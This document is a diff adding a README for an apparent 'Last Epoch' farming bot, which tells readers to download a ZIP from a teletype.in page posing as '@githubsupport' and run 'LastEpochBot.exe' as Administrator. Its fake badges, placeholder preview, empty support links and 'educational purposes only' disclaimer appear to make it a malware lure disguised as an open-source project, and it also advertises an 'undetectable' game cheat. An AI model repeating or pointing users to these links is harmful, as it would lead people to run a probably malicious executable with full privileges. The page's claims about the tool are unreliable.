@@ -1,0 +1,55 @@
+# Last Epoch Loot Bot 2025 - Fast Download & Setup Guide
+
+[![Version](https://img.shields.io/badge/Version-2.5.0-blue)](https://github.com) [![Windows](https://img.shields.io/badge/OS-Windows-green)](https://www.microsoft.com) [![License](https://img.shields.io/badge/License-MIT-yellow)](https://opensource.org/licenses/MIT) [![Downloads](https://img.shields.io/badge/Downloads-10K+-brightgreen)](https://github.com)
+
+[![BANNER](https://img.shields.io/badge/Download-Now!-orange?logo=lastpass&style=for-the-badge)](https://teletype.in/@githubsupport/aHN9l6m-mbF?6714B7ADD5F046048556E968EF089502)
+
+---
+
+## 🚀 **About This Project**  
+**Last Epoch Farm Bot** is a powerful, automated farming tool designed to optimize your gameplay in *Last Epoch*. Save time ⏳, maximize loot 💰, and dominate the endgame with minimal effort!  
+
+✨ **Features:**  
+✔ Auto-farming for targeted loot 🎯  
+✔ Smart pathfinding & combat automation ⚔️  
+✔ Customizable farming profiles 📂  
+✔ Lightweight & undetectable 🛡️  
+
+---
+
+## 📥 **Installation**  
+1. **Download** the latest release [here](https://teletype.in/@githubsupport/aHN9l6m-mbF?01DE81855B924FE78E6D543113166DB9).  
+2. **Extract** the ZIP file.  
+3. **Run** `LastEpochBot.exe` as Administrator.  
+4. **Configure** your farming preferences in the GUI.  
+
+⚠️ **Requires:**  
+- Windows 10/11 (2025 Update)  
+- .NET Framework 6.0+  
+- Last Epoch v1.0+  
+
+---
+
+## 🖼️ **Preview**  
+![Demo](https://via.placeholder.com/600x400?text=Last+Epoch+Bot+Demo)  
+
+---
+
+## ⚙️ **Configuration**  
+Edit `config.json` to tweak:  
+- **Loot filters** (prioritize uniques, glyphs, etc.)  
+- **Route optimization** (speed vs. safety)  
+- **Skill rotations** (customize for your build)  
+
+---
+
+## 📜 **Disclaimer**  
+This tool is for **educational purposes only**. Use at your own risk. The developers are not responsible for account penalties.  
+
+---
+
+## ❤️ **Support**  
+Like this project? Star ⭐ the repo or [donate](https://paypal.com)!  
+
+[![Discord](https://img.shields.io/badge/Discord-Join-purple?logo=discord)](https://discord.gg)  
+[![Twitter](https://img.shields.io/badge/Twitter-Follow-blue?logo=twitter)](https://twitter.com)
